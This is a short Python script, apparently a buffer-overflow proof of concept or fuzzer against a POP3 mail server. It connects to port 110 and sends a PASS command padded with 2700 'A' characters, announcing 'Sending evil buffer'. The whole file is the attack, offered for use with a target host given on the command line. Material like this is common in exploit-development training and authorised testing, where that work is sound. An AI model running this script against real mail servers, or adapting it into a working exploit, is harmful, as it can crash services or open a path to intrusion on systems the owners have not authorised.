#!/usr/bin/python

import socket
import sys
import time

try:
    server = sys.argv[1]
    port = 110
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()


buffer = "A" * 2700


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print ("\nSending evil buffer...")
	s.connect((server, port))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS " + buffer + "\r\n")
	print("\nDone!.")
	s.close()
except KeyboardInterrupt:
	s.close()
	sys.exit()
except Exception as ex:
	print ("Could not connect to POP3!", ex)
